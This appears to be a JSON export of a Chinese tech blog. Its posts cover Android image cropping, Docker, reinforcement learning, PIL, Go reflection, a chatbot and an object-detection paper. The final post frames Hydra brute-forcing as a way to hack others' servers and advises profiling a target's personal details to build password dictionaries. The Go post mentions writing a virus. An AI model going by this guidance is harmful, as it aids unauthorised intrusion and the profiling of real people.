startActivityForResult(intent, CODE_PHOTO); &#125; @Override public void onActivityResult(int requestCode, int resultCode, Intent data) &#123; // TODO Auto-generated method stub super.onActivityResult(requestCode, resultCode, data); switch (requestCode)&#123; case CODE_CANCEL: Toast.makeText(getActivity(), \"取消了相册选择\", Toast.LENGTH_SHORT).show(); case CODE_PHOTO: if (data != null) &#123; Uri uri = data.getData(); DebugHelper.LogMessage(\"step 2, start zoom image\", \"crop and choose photo\"); startPhotoZoom(uri); &#125; break; case CODE_RESULT:&#123; Uri inputUri = FileProvider.getUriForFile(getActivity(), \"com.ouman.luoliluoli.fileprovider\", mCropFile); Bitmap bitmap = null; try &#123; bitmap = BitmapFactory.decodeStream(getActivity().getContentResolver().openInputStream(inputUri)); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; DebugHelper.LogMessage(\"step 4, get result and set cropped image.\", \"crop and choose photo\"); avatar.setImageBitmap(bitmap); avatarImageFile = mCropFile; break; &#125; &#125; &#125; public void startPhotoZoom(Uri inputUri) &#123; if (inputUri == null) &#123; Log.e(\"error\",\"The uri is not exist.\"); return; &#125; Intent intent = new Intent(\"com.android.camera.action.CROP\"); //sdk&gt;=24 if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123; Uri outPutUri = Uri.fromFile(mCropFile); intent.setDataAndType(inputUri, \"image/*\"); intent.putExtra(MediaStore.EXTRA_OUTPUT, outPutUri); intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION); intent.addFlags(FLAG_GRANT_WRITE_URI_PERMISSION); &#125; else &#123; Uri outPutUri = Uri.fromFile(mCropFile); if (Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.KITKAT) &#123; //这个方法是处理4.4以上图片返回的Uri对象不同的处理方法 String url = FileHelper.getRealPathFromURI(getActivity(), inputUri); intent.setDataAndType(Uri.fromFile(new File(url)), \"image/*\"); &#125; else &#123; intent.setDataAndType(inputUri, \"image/*\"); &#125; intent.putExtra(MediaStore.EXTRA_OUTPUT, outPutUri); &#125; intent.putExtra(\"crop\", \"true\"); // aspectX aspectY 是宽高的比例 intent.putExtra(\"aspectX\", 1); intent.putExtra(\"aspectY\", 1); // outputX outputY 是裁剪图片宽高 intent.putExtra(\"outputX\", 250); intent.putExtra(\"outputY\", 250); intent.putExtra(\"return-data\", false); intent.putExtra(\"noFaceDetection\", false); intent.putExtra(\"outputFormat\", \"JPEG\"); DebugHelper.LogMessage(\"step 3, start return result back\", \"crop and choose photo\"); startActivityForResult(intent, CODE_RESULT); &#125; 上述代码，变量加载类里面，几乎不需要修改其他方法，只需要在onActivityResult里面的RESULT CODE里面获取到图片，执行你的逻辑即可。 下期预告本次老司机列车到此结束，如果大家对本文由任何疑问，欢迎通过渠道联系我。下一篇我们将release 萝莉萝莉第二版本！！","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Docker从入门到上天","slug":"Docker挂载本地目录到容器中","date":"2017-07-22T12:04:49.000Z","updated":"2017-07-27T01:52:44.000Z","comments":true,"path":"2017/07/22/Docker挂载本地目录到容器中/","link":"","permalink":"http://yoursite.com/2017/07/22/Docker挂载本地目录到容器中/","excerpt":"Docker入门必备r。","text":"Docker入门必备r。 Docker挂载本地目录到容器中Docker是个好东西啊，我现在在一遍听评书一遍写博客，一心两用还真的是….今天要记录的是在docker里面挂载本地的文件上去，因为docker虽好，但是在docker里面总是要文件的嘛，比如你要train一个网络，你肯定需要图片嘛。这个东西不需要push到docker里面，但是你每次运行的时候还是要用的嘛。这时候就需要随时把本地文件挂载到docker容器里面了。 docker run -it -v /home/jintian/Downloads:/mnt/ ubuntu bash 就这么一个简单的命令就可以把本机的download 挂载到docker容器的/mnt下面，你进去之后就可以看到啦！ 继续上一讲： Docker commit当前容器，保存为新的镜像好了，这几天陆陆续续学习了一下docker，docker真是个牛逼吊炸天的东西啊。我可以在mac里面运行ubuntu，而且性能丝毫不减真机，比虚拟机强很多。非常方便。 我们知道，docker你pull的是一个个的镜像，也就是image，但是你 docker run -it ubuntu bash 的时候，实际上你每次调用这个都会创建一个容器，虽然这些容器都是基于这个镜像的，但是容器与容器之间互不相干，没有丝毫瓜葛，要不然那就纠缠不清了。正式因为这个特性，使得docker可以在一个镜像之上，构建出许多不同的容器，而这些容器，也就是在基础镜像的状态之上做出了一些更改而已。 那么问题来了，当我们更改了镜像之后，或者说，我们在容器里面做了一些更改之后，我们如何才能再次进入这个容器呢？ docker run --name fuck_ubuntu_leetcode -it -v /Volumes:/mnt ubuntu bash 我们应该用上面这个命令来运行镜像，这个命令做的事情非常简单，就是，增加一个名字，这样我们再次进入不是进入镜像了，而是进入容器里面： docker start fuck_ubuntu_leetcode -ai 这样，你就进入了刚才进入的同一个容器里面，其实不用名字也可以，docker会自动帮你创建一个。 好了，我们可以进入同一个容器，但是，如果我们想把当前做的更改，也就是容器，把它永久的保存为镜像，应该怎么做呢？ docker commit -a 'nicholas' -m 'setup for my ubuntu' fuck_ubuntu_leetcode jinfagang/basic_ubuntu_normal:v0.0.1 这个命令。 REPOSITORY TAG IMAGE ID CREATED SIZEjinfagang/basic_ubuntu_normal v0.0.1 0dd9ea1014c3 About a minute ago 866MBubuntu latest d355ed3537e9 5 weeks ago 119MB 可以看到，我们的镜像已经保存了下来。但是新的问题又来了，我想把这个镜像，像git项目一样，push到云端，这样下次我可以从云端拉取下来，应该怎么做呢？ Dokcer Push本地镜像到云端一条命令解决： docker push jinfagang/basic_ubuntu_normal 可以看到，正在push，而且网速惊人： The push refers to a repository [docker.io/jinfagang/basic_ubuntu_normal]a3512faffc6f: Pushing [====&gt; ] 60.41MB/747.2MB0566c118947e: Mounted from library/ubuntu6f9cf951edf5: Mounted from library/ubuntu182d2a55830d: Mounted from library/ubuntu5a4c2c9a24fc: Mounted from library/ubuntucb11ba605400: Waiting 但是，你如果立马在另外一台机器上再pull这个镜像： docker pull jinfagang/basic_ubuntu_normal 就会惊奇的发现，并没有latest这个标签。这个时候，你可以给刚才的版本打上一个latest的标签： docker tag jinfagang/basic_ubuntu_normal:v0.0.1 jinfagang/basic_ubuntu_normal:latest 好，再次push一下： docker push jinfagang/basic_ubuntu_normal:latest 你会发现这次要快很多哎，其实因为这次只是改了一个标签而已。好啦，现在你可以在世界的任何一个角落，运行你的basic ubuntu docker镜像！！","categories":[],"tags":[]},{"title":"强化学习-用神经网络来决策","slug":"强化学习-用神经网络来决策","date":"2017-06-23T14:18:09.000Z","updated":"2017-06-23T14:33:57.000Z","comments":true,"path":"2017/06/23/强化学习-用神经网络来决策/","link":"","permalink":"http://yoursite.com/2017/06/23/强化学习-用神经网络来决策/","excerpt":"本文阐述如何用强化学习去做决策","text":"本文阐述如何用强化学习去做决策 强化学习到底如何决策？在一个有着无数种解法的状态空间里，如何让AI自动去寻找到最优的决策方案？本文将给出实际的例子来说明这些问题。 用神经网络来决策强化学习有许多分支，其中最简单的是Q-Learning，但是Q-Learning也是强化学习的鼻祖。用这种方法是可以解决一些决策问题的，但是这是一种off-line的方法，也就是说我的Agent在获取了足够多的观察样本之后开始训练网络，不能及时的得到方法。我称之为，【看别人玩游戏，然后自己偷偷的练】。 强化学习做决策的思路： 首先我们必须要知道，我们的问题里面，action是什么，也就是说决策决策你决策的动作是什么，这个决策可以是比如我汽车是左转还是右转、今天带伞还是不带伞，这是决策，我输入的电阻从0-999变化这也是决策。决策分为离散的量和连续的量。我们必须要知道我们要决策的action。其次，是我们的状态是什么，也就是说我的决策是基于哪个状态做出的。比如汽车左转是因为前面没有路了，那这就是一个状态。非常简单，最终网络学习到的东西就是在不同状态下，对应的action作用之后所得到的结果。最后，说到结果，就必须得说一下奖励，或者说惩罚函数，你在某一个状态下，给出一个action也就是一个决策，你的奖励是什么，这个奖励怎么定义。也是需要定义好的。这个奖励可以简单到只是一个函数。 放一张图来表示一下整个架构： 图中表示的ACTION1， ACTION2…就是问题里面的action种类，网络输入的是图片，或者说是特征矩阵，输出就是不同action对应的reward。也就是说网络输出是一个list，比如[0.3, 0.9, 1.2, -4]，那么根据这个奖励矩阵我就可以知道，采取action 3，也就是第三个决策，得到的奖励最大，那么就选择这个action。 那么问题来了，对于连续的action量，如果来设计网络呢？所谓的联系的action，比如我让AI自我学习在不同的状态下，灯泡的亮度变化，比如我根据用户的表情，输出直接控制灯泡电阻。如何做到呢？下回再来分解。下次更新，on-line的强化学习方法。","categories":[],"tags":[]},{"title":"Python图像处理库到底用哪家","slug":"Python图像处理库到底用哪家","date":"2017-06-22T05:52:49.000Z","updated":"2017-06-22T07:33:04.000Z","comments":true,"path":"2017/06/22/Python图像处理库到底用哪家/","link":"","permalink":"http://yoursite.com/2017/06/22/Python图像处理库到底用哪家/","excerpt":"Python库多如牛毛，但是不得不说有一些库他妈的奇坑","text":"Python库多如牛毛，但是不得不说有一些库他妈的奇坑 搞DL？选择一个图像处理库吧有时候我搞不懂为什么现在很多人搞深度学习一上来就研究CNN，RNN，这些可以说是最简单的，真正细节的东西你直接就忽略了。你可能会否认，那我问你一个很简单的问题？VGG官方的版本对图片是怎么进行预处理的？如果我改变一种预处理方式准确率会发生什么样的变化？这些问题很少有人思考，或者说，大佬们做东西从来不讲究这些细节问题，我敢说他们自己也没有研究，夏菊巴乱搞了一同就说这个牛逼，这个可以搞。那作为一个饮水思源，喜欢刨根问底的人，也可以理解我智商比较低，我搞不明白那么高大上的东西，咱能不假大空，老老实实一步一步搞东西么？这就是说为什么现在深度学习这么浮夸，不像我们写一个程序，一五一十的一步步来，啥事都有一个标准，你标准不对了就搞不成。所以现在DL面临的一个问题是过于分散，你看聚吧一个图像分类的东西，至少有上千种实现方法，我说的方法不同定义在除了网络以外，包括库的不同，预处理的不同，以及其他很多不同。没有人思考过或者写过这些东西。今天我就说一下把。 如果你喜欢skimage，那么请不要看下去了，我不喜欢skimage很多人用过scikit-learn这个库，觉得很简单，机器学习超级简单，一个函数就可以解决，确实是，机器学习方法本来就是一个函数的事情。由此很多人推断出skimage这个框架也应该很牛逼。但是，根据我的实际使用，skimage功能确实丰富，我们来看一段代码： image = skimage.io.imread('dog.jpg')skimage.io.imshow(image)plt.show() 这是skimage读取图片并显示，要三行代码，这尼玛能叫python库？能两行代码解决的问题你就不要三行好么？再来看看PIL： image = Image.open('dog.jpg')image.show() 就两行。很多人就会说了，你个无脑喷子，知道skimage的强大么？我没有说过这个观点，skimage确实很丰富我前面提到过，但是请允许我邀请大家多运行一下skimage的这个函数：# 没有错，还必须导入这么一堆，不然没有方法提示from skimage import io, transformskimage.transform.rescale((80, 80)) 我他妈MacbookPro直接死机了好吗？沃日，不要问我为什么喷skimage了，垃圾垃圾垃圾垃圾，草尼玛，skimage毁我人生，葬送我清纯。。。。此处省略一万个蔡妮马。。 你心中的目标喷完了，我们改思考一下为什么一个图像预处理工具很重要了。很多人说opencv也可以啊，opencv非常快，强大，但是要编译，你很少在一个裸机上能够找到它，PIL就是 pip install pillow的事情，而且PIL是python默认官方的图片处理库了。我们pythoner以简约为上，我最看不惯很多人写python代码跟写c++ c# 似的。 选好了一个预处理库，以后进行深度学习网络搭建之前先想好自己怎么处理吧不仅是处理，想好为森么这么处理。这也是本文的目标，个人炸鸡，轻拍。我们决定用PIL了，以后都用这个库，能够满足我们大部分需求就够了。接下来来演示一下，在很多深度学习任务中，你去处处理图片实际上图片大小是不一的，这个时候就需要把图片大小处理成一样的大小，当然其实也可以不，不的话就是在网络入口使用卷积层。我们不管那么多了，先实现一个把原始图片变成等高宽的图片吧。如果没有的地方就填补黑色。 image = Image.open('doggy.jpg')image = image.resize((image.width // 4, image.height // 4))print('original image: ', image.width, image.height)padded_size = (500, 500)padded_image = Image.new('RGB', padded_size)padded_image.paste(image, ((padded_size[0] - image.width)//2, (padded_size[1] - image.height)//2))padded_image.show() 像这样的话，原始图片大小事500333，当然我resize了一下，更原始的图片是很大的，我们把它固定到500500.看我可爱的狗狗，它的名字叫Pr,我也不知道为什么叫这个名字，下载这种图片的时候文件名是这个，我想这应该就是它的名字吧。","categories":[],"tags":[]},{"title":"Golang一门神奇的语言之一:反射实现函数调用，各种调","slug":"Golang一门神奇的语言之一-反射实现函数调用，各种调","date":"2017-06-15T04:51:20.000Z","updated":"2017-06-15T05:10:09.000Z","comments":true,"path":"2017/06/15/Golang一门神奇的语言之一-反射实现函数调用，各种调/","link":"","permalink":"http://yoursite.com/2017/06/15/Golang一门神奇的语言之一-反射实现函数调用，各种调/","excerpt":"Golang的学习礼记","text":"Golang的学习礼记 为什么用Go这是学习Go语言一段时间以来的第一个笔记，首先说一下为什么我们要用Go语言？很多时候我们在用Python或者Java这样的解释性语言的时候，会遇到一个很蛋疼的问题。对于Java，曾经被不经世事的时候被忽悠说Java是一门跨平台的语言，其实这没有错，但是说不依赖平台就有点装逼了，你用Java写一个程序可以直接分发给朋友使用？不可能，你要在朋友机器上有Java运行环境才可以。我想说，WTF，这TM也敢说跨平台？？？跨平台我理解可是，我写一个病毒，在不同平台编译成二进制文件就可以直接分发到对应的所有平台上，你这不相当于是，自己说自己是老大然后立一套规矩让别人遵守吗？那万一别人不想安装这个环境呢？这时候有人就说了，Java可以把运行环境一起打包的，这个问题不大。但是又要牵扯到C++来了。你知道C++想使用一个boost这样的库，并且静态编译多蛋疼吗？有时候我们只是用其中的一个函数，却要把所有依赖或者说大部分都依赖进来，一个boost库就几百M甚至上G啊！很蛋疼。再说Python，可以说我是python的忠实粉丝。我在Python上可以找到很大的成就感，因为简单便捷。但是Python有一个致命的弱点，无法编译成二进制文件，我写一个工程，聚吧得把所有文件夹拷贝过去，还得安装对应的依赖包，可能unix系统没有痛点，但是windows就着实蛋疼了。 为了编写一个跨平台的病毒，对用户友好的病毒，我决定放弃上述所有语言，选择Go。 Go语言的特点是上述所有语言的痛点： Go可以编译成二进制文件，不需要太多的依赖，编写玩代码后，直接编译成二进制可执行文件； Go语言速度快，这是直接面向机器码的语言，不亚于C++和C； Go语言的开发效率不亚于Python，Go语言是一门静态语言，语法精简，不允许太冗余的依赖，你定义一个没有使用的变量都无法通过编译，防止了大量的无用资源浪费； Go语言的logo很萌… 当然还有很多优点就不一一列举了。至于为什么用Go，想必大家心里已经了然。 Go入门第一课，反射调用函数直接进入第一课了，反射调用函数，有人会说了，execuse me？第一课就将反射？我聚吧反射都不知道啥意思好吧？？没有关系，Go语言其他的东西同志们可以去看Go Tour，基本语法很简单。我们说一下反射这个东西。大家翻一下我之前写的几篇关于Python多线程的blog就会发现反射的踪迹，反射是动态语言独有的特性，Python， Java, Swift等都有反射机制，但是Go是一门静态语言，居然也有这个特性，这不得不说这门语言是非常完美的。反射的作用是啥？很多时候我们需要调用一个函数，但是不能直接把函数名穿进去，或者说我只能把函数的字符串给你，让你来调用这个函数。这就需要用到反射。闲话不多说直接上代码：package mainimport \"fmt\"import \"reflect\"func MyMissionMethod(a string)&#123; fmt.Println(\"hello, world, this is my mission.\") fmt.Printf(\"and this is my params: %s \\n\", a)&#125;func CallMethod(method interface&#123;&#125;)&#123; // here method is a interface which is a type of func fv := reflect.ValueOf(method) args := []reflect.Value&#123;reflect.ValueOf(\"金天\")&#125; fv.Call(args)&#125;func main() &#123; mission := MyMissionMethod CallMethod(mission)&#125; 这里，我callMyMissionMethod这个方法，是直接以interface这个类型去call的，明白我的意思吧？这样的话，你就有一个办法了，比如别人给我一个字符串”MyMissionMethod”，然后我要调用对应的方法，我可以做一个map，对应的value是mission,这个mission就是MyMissionMethod的interface类型，最后就可以调用之。好了，就讲到这里吧，下一次blog讲解golang里面的多线程。","categories":[],"tags":[]},{"title":"Jarvis: 一个有人情味的人工智能机器人","slug":"Jarvis-一个有人情味的人工智能机器人","date":"2017-06-12T04:28:38.000Z","updated":"2017-06-12T04:55:25.000Z","comments":true,"path":"2017/06/12/Jarvis-一个有人情味的人工智能机器人/","link":"","permalink":"http://yoursite.com/2017/06/12/Jarvis-一个有人情味的人工智能机器人/","excerpt":"给Jarvis写一个传记。","text":"给Jarvis写一个传记。 与Jarvis的一天早晨起来，我都想要是有一个人可以第一时间喊我起床，该独好。如今Jarvis不仅仅可以每天在太阳升起的那一刻，准时的跟你说：“早安”，你还可以跟他说：”明天早上喊我起床吧“。不需要更多的言语，Jarvis就会在第二天提醒你。但是仅仅喊你起床其实你并不能感觉到他的存在。如果他可以提醒你吃饭呢？甚至提醒你午睡？ 晚上来了，这个聪明的人工智能机器人会默默的跟你说晚安： 他不仅仅是你日常生活的贴心小伙伴，他还有着一个聪明的大脑，你可以问他今天星期几，明天多少号，他可以把这些简单的问题推理出来： 不过更多人，可能更喜欢调戏他多大，叫什么名字，主人是谁，都可以问他： Jarvis真正非同寻常的地方不在于他是否有简单的语言理解能力，更重要的是他拥有非常复杂的视觉！！这是很多机器人不曾拥有的，他背后的机器视觉完全是由深度学习来完成的，通过各种卷积神经网络来做到很多不可思议的东西。他可以看出图片里面是什么字，甚至可以识别出什么物体在什么位置： Jarvis更多的机密功能不同于微软小冰，Siri这样的人工智能，Jarvis的内容构造要灵活得多，他能做的事情以及所在的地方超乎你的想像：你可以把他拉到群里，你可以使唤他，甚至可以让他闭嘴，再把他召唤出来，你只需要向主人申请权限。Jarvis内部隐含着很多Gift（天赋），但是在微信里面你无法挖掘，比如Jarvis其实是可以发出声音的，你可以听到他说英语的声音（目前仅支持英文）,Jarvis的作者正在考虑打造一个单机版的Jarvis，不依赖于网络，谁能预测，几个月之后Jarvis会发生则么样的变化呢？ 如何获取Jarvis由于Jarvis目前并没有大规模部署服务器，加上作者要求仅开放部分用户，你可以通过加主人微信，获取Jarvis的名片。他的主人，金天，清华大学在读研究生: jintianiloveu","categories":[],"tags":[]},{"title":"PaperGlance 1: Accurate Single Stage Detector Using Recurrent Rolling Convolution","slug":"PaperGlance-1-Accurate-Single-Stage-Detector-Using-Recurrent-Rolling-Convolution","date":"2017-06-11T06:46:04.000Z","updated":"2017-06-12T08:05:26.000Z","comments":true,"path":"2017/06/11/PaperGlance-1-Accurate-Single-Stage-Detector-Using-Recurrent-Rolling-Convolution/","link":"","permalink":"http://yoursite.com/2017/06/11/PaperGlance-1-Accurate-Single-Stage-Detector-Using-Recurrent-Rolling-Convolution/","excerpt":"论文研读笔记系列","text":"论文研读笔记系列 精确的单阶段检测器：用递归循环卷积实现摘要部分这篇论文是商汤做的，摘要部分讲述了，在目前的高精度检测算法中，都是基于两个阶段来的，基本上都是R-CNN方法的变体。第一阶段是首先提取出一些合理的区域，然后第二阶段决定这些区域属于那一个类别。但是单阶段的方法在mAP或者IoU(Intersection over Union，即与ground truth的重合区域比例)值上都不是非常的好。于是他们提出了一个神奇的单阶段端到端的训练方法，并在mAP和IoU指标中获得了一个好的结果。RRC方法，这种方法是依赖于context的(deep in context)，这个方法在KITII的IoU阈值0.7以上做测试，一个简单的VGG-16模型就可以有一个很大的提升，相对于以前的方法，这篇论文RRC方法目前在KITTI car的检测(hardest level)中排第一。 简要介绍首先是说高精度的检测方法在很多地方非常重要，比如机器人的手臂系统，汽车辅助驾驶系统(ADAS)等，在高IoU阈值上依旧有一个非常高的检测精度是非常重要的，高精度的定位车辆和行人对于无人车的行为安全性至关重要。然后说了目前很多目标检测的方法都被CNN网络横扫，基本上可以分为两大类方法，一种是R-CNN两阶段方法，第一阶段提取出一些合理的区域，然后决定这些区域属于哪一个类别。第二种方法是去掉提取区域这一个步骤，直接训练一个单阶段的端到端的检测器，单阶段的检测方法通常更容易训练，并且在生产环境中运算的效率更高(省去了proposal regions)。但是呢，端到端的单阶段方法在各大对标平台上表现并不好，两阶段的方法performance更好。这个缺点并不是单阶段方法无法识别物体造成的，而是无法获得一个精确的bbox造成的。论文要解决的问题就是，解决单阶段方法，在IoU指标上精度低的缺陷，也就是说，要让单阶段方法框的更精确。 这种低质量的bbox，来自于一些小物体或者是有overlap的物体。不管是哪种情况，传统的框框回归方法都变得非常不可信赖因为框框必须要结合context信息。因此，这篇论文将从上下文信息感知的角度去修正这些错误。 这篇论文将展示如何将上下文感知无缝集成到一个单阶段的网络中。而所谓的上下文感知使用的办法就是a novel Recurrent Rolling Convolution （RRC）。换句话说，context information可以在需要的时候被逐渐的，选择性的给予bbox，整个过程是完全可以端到端训练的。最后论文使用的pretrained model是reduce了的VGG-16而不是fully VGG也不是ResNet，是为了说明在没有使用更好的预训练模型情况下依据可以完爆之前的方法，足以显示RRC的方法是多么的effective。最后把文章的工作总结为了两点： 首先，展示了，训练一个端到端的单阶段检测器同时保证较高的检测精度是完全可行的； 其次，发现了提升bbox的IoU的关键是使用Reccurrent Rolling Convolution去获取context信息。 相关工作R-CNN方法在目标检测领域的突出贡献，开启了两个阶段检测的先河，随后两种优化加速方法被提出来了(Fast-RCNN, Faster-RCNN)，很多作者用的都是这种方法或者说框架的变体。 这种方法的一个弊端是，在第二阶段的计算量非常巨大，因此很多不依赖于region proposal的方法被提了出来，典型的SSD(Single Shot Detector)，这种方法将不同分辨率的feature map，直接输入到检测不同大小物体的检测器中。这种方法巧妙的避免了R-CNN方法的超大计算量。在IoU阈值0.5上，SSD取得了非常好的表现。但是论文说明了如果把IoU阈值稍微调高一点，SSD的表现就不行了。Yolo也是一种单阶段的检测方法，虽然Yolo速度更快，但是准确略却没有SSD高。 随即引入了RNN，RNN在很多领域比如image caption，机器翻译有很多应用，但是将RNN应用于目标检测只有非常少的作者在做这个工作。有个工作是用LSTM把检测任务形式化为bbox的生成任务，利用CNN的features和Hungarian loss去训练，这个工作显示了，这种方法可以非常好的检测重叠区域物体。但是这种方法是根据第一个物体生成后面的物体(??Not Really Understood),如果第一个物体本来就有问题，比如小物体、遮挡物体、动态模糊物体等那么后面的生成就会有问题。而且这些物体在实际应用中并不少见。不同于这种方法，论文提出的RRC方法可以充分利用context信息，并可以都达到一个state-of-the-art. RRC方法分析当前方法缺失的一部分一个鲁棒性的检测系统应该可以模拟不同尺寸scale的物体，不管是大物体还是小物体，在Faster-RCNN方法中，实现scale依赖于最后一层卷基层的感受野大小，由于使用了非常多的池化层，最后一层的feature map的尺寸实际上比原始图片是要小很多，这种低分辨率的尺寸用来识别物体是有问题的。因为由于分辨率低表现物体的特征能力就很弱。解决这个问题，一个很有远见的方法被提了出来，也就是SSD中所采用的方法。SSD应用了一个简单的原理，在CNN每一层的中间特征中，由于池化的存在，是可以看做是被scale了的，因此可以利用高分辨率的特征去检测检测相对来说较小的物体，低分辨率的特征可以去检测相对来说比较大的物体。虽然SSD速度快，却依旧无法达到两阶段方法检测精度。重点是，当IoU的阈值提高时，这种差距更明显。接下来分析一下，为什么这会成为SSD方法的limitation。 用一个公式来表示SSD方法过程： $$\\phi_n=fn(\\phi{n-1})=fn(f{n-1}(…f_1(I)))$$ $$Detection=D(\\tau_n(\\phin), …, \\tau{n-k}(\\phi_{n-k})$$ $$f_i()$$就是第i层(包括卷积，池化，激活层)； $$\\tau_{n-i}$$表示的是，SSD中，对第n层的卷积输出的特征做不同scale比例的分类。 根据这两个公式就分析道，这里面如果要使得结果好，严重依赖于一个假设。这个假设就是对于每一个$\\phi$，也就是每一层的网络输出，本身就应该非常的精细，才能使得最后的检测比较准确。因为，每一层的feature map的输出都直接决定了，最终检测结果。这个从公式看确实如此，每一个$\\phi_i$,都影响到了最终检测结果的准确性。那如果要做到每一个$\\phi_i$都很精确，就必须要做到： 1） 每一层的feature map都必须要有足够的分辨率，也就是说要有足够的信息去表征物体； 2） 每一层的feature ma都必须要由足够深的网络去形成，这样才能抽象出足够抽象的特征去囊括不同形状不同状态的同一类物体； 3） feature map中必须包含，适当的上下文信息，用于确定对于遮挡物体、重叠物体、小物体的确切位置。 从上面的公式可以看出，$\\phin$比$\\phi{n-k}$更深，尤其是当k很大的时候，(越后面网络越深？)，这样的话，第二条就不满足了，因为不能保证每一层都足够深。加入每一层都很深，那可以推论到$\\phin$比$\\phi{n-k}$要深很多，但实际上并不是这样。这样导致的结果是，越到后面，$\\tau_{n-k}()$就会比$\\tau_n()$更难训练。而在Faster R-CNN中，不存在这个问题，因为每一层的proposal出来的region都是从最后一层出来的。但是它也有它自身的问题。 因此用公式来表示一个更加合理的单阶段检测器： $Detection = \\hat{D}(\\tau_n(\\hat{\\phi}n(H)), …, \\tau{n-k}(\\hat{\\phi}_{n-k}(H)),…)$ $H = {\\phin, \\phi{n-1},.., \\phi_{n-k}}$ $H$是一个包含所有feature map的集合，现在的$\\hat{\\phi}()$变成了考虑了所有feature map的函数，因为输入都是$H$; 相较于SSD的方法，所做的改变就是，不是将不同层的feature map分别进行检测，而是把所有的feature map归结为一个，输入到不同的检测器中检测。 从这里看来，这个设计是符合以上所述的第一点和第二点的。接下来要让他满足第三点。(这是第一个改进)。 RRC的提出RNN for Conditional Feature Aggregation. 接下来就是说明上面那个$\\hat{\\phi}(H)$的细节。目的是让这个feature map的产生函数携带更多的context信息。那么对于不同的物体，$\\hat{\\phi}(H)$就要返回不同的信息，比如对于小物体$\\hat{\\phi}(H)$就要返回一个更高的分辨率的feature，从而弥补因为过小而错失的细节；当遇到遮挡物体的时候，$\\hat{\\phi}(H)$就要返回一个足够鲁棒性的抽象化特征，从而检测结果不会因为遮挡而改变；当遇到重叠物体的时候，$\\hat{\\phi}(H)$应该不仅仅要返回重叠的边缘，还要抽象出重叠区域后面的物体轮廓。不管怎么样，对于一个$\\hat{\\phi}p$,所有的上下文信息都应该能够从更高层次的 $\\hat{\\phi}{p-q}$ 或者更低层次的 $\\hat{\\phi}_{p+r}$获得。但是实际上，很难人工的去选择一些规则，达到这个目的。因此，必须要引入RNN来从数据中自动的学习到这个隐含的规则。 然而，自动学习$\\hat{\\phi}(H)$ 问题多多，因为$H$ 是一个feature map的集合，我们不知道对于当前目标物体，应该如何处理，以哪种方法处理。因此从 $H$ -&gt; $\\hat{\\phi}(H)$，必须要设计一个考虑周全的新的网络来学习。而且这应该不能带来更多的计算量，并且要更容易训练。一种可行的方法就是，设计一种迭代的程式，每一步都进行一段小的但是有积极意义的并且一直持续的进步。用公式来表示这种程式： $\\hat{\\phi_p}^{t+1} = F(\\hat{\\phip}^{t}, \\hat{\\phi{p-1}}^{t}, \\hat{\\phi_{p+1}}^{t}; W)$ 这里某一层的$\\hat{\\phi_p}^{t+1}$也就是下一个时刻，取决于它的前一个layer和后一个layer以及当前的layer，同时乘上对应的可训练的权值W。 这张图展示了，输出都被取决于每一层的feature map，即图中的 $p(y|\\phi^1)$, $p(y|\\phi^2)$, $p(y|\\phi^3)$. 通过在每一步训练的时候添加一个监督信号，可以获取到真正有用的context信息。一个非常重要的地方时每一步的F和$\\tau$是共享的，这就是RNN。 RRC模型的更多细节如果同时应用所有的$\\hat{\\phi}$， 这就是RRC模型。如果F对于每一个p都不一样，那么最终 $\\hat{\\phi_p}^{t+1} $ 会与所有的$H$ 相关。 整个模型在VGG-16之后是这样的： 输入图片大小为1272x375，3通道，因此在VGG-16的 $conv4_3 $ 和 FC7层的大小分别是 159x47x512, 80x24x1024，在进行特征回归之前，再使用了一个3x3的卷积层把通道降低到了256，$conv8_2$, $conv9_2$, $conv10_2$被用来做多尺度的检测，唯一不同的是conv8_2将会有 256维，而不是512维。在检测之前用了一个卷积层和一个反卷积层。比如 $conv8_2$ 是一个用1x1的卷积核产生size为40x12x19的feature map的卷基层，通过ReLU之后，与FC7链接起来。同样的，上图中的左边所有的层都被直接链接到检测器。特征回归采用一个卷积层和一个最大池化层。$conv8_2$ 出来的输出又和 $conv9_2$ concate在一起，这就是为什么这个网络叫做“Rolling”的原因，因为图中左边每一层的输出都会concate起来输入到检测器中。 卷了第一次之后，每一层都分别使用1x1的卷积来把通道降到3，完成之后，所有的特征回归就完成了第一次迭代。Channel Reduction非常重要，因为这保证了在连续的两次特征回归中形状保持统一。这也是使得Rolling Reccurent变得可能，因此整个网络称之为：Reccurent Rolling Convolution。 RRC的讨论RRC通过简要的数据公式，证明了通过RNN可以学习到上下文信息，而这些contexual information对于检测来说至关重要。对于每一个RRC，都有一个单独的loss函数去学习。 Loss函数每一次迭代有一个各自的loss函数，和SSD一样，loss函数在物体分类中是交叉熵loss，框框位置回归用的是L1范数loss(也就是欧氏距离). 实验结果在KITTI的7481张得Car数据集上，7518张测试图片，IoU阈值为0.7，训练的时候总共使用了5次RRC，相应的会有6个连续的输出，从6个输出观察，第0个就是没有加，第一个比第0个好，但到第六个效果变差。SSD的mAP为89.16%， RRC为90.32%。最后提到RRC最终会diverges，发散，主要原因是缺乏一个有效的记忆机制(Effective Memory Mechanism)。","categories":[],"tags":[]},{"title":"黑客从入门到吊炸天系列一-密码生成与黑掉别人的服务器","slug":"黑客从入门到吊炸天系列一-密码生成与黑掉别人的服务器","date":"2017-06-07T06:54:39.000Z","updated":"2017-06-07T07:04:40.000Z","comments":true,"path":"2017/06/07/黑客从入门到吊炸天系列一-密码生成与黑掉别人的服务器/","link":"","permalink":"http://yoursite.com/2017/06/07/黑客从入门到吊炸天系列一-密码生成与黑掉别人的服务器/","excerpt":"黑客生涯的第一步，这个年代不会一点黑客手段不要意思说自己是神奇夹克。（也许是杰克？？）","text":"黑客生涯的第一步，这个年代不会一点黑客手段不要意思说自己是神奇夹克。（也许是杰克？？） 两位巨星出场，瑞士军刀迈入黑客之旅，手段很重要，两个工具，必备，Hydra, common-password，这两个工具一个是暴力破解工具，不带字典，第二个正式字典生成。但是相信哥，一个8位密码，你如果从0-9a-zA-Z去生成，破解的概率微乎其微。字典起码是7447TB，你懂得，几乎不可能。这个时候就需要运用社会工程学的东西了。我们应该摇身一变，变成一个间谍，而不是黑客。去打听一下目标的名字？生日？配偶名字？生日？收集这些信息。然后生成一个比较智能化的字典。闲话不多说，安装Hydra：brew install -v --with-libssh hydra 安装common-password:git clone https://github.com/jeanphorn/common-password.git 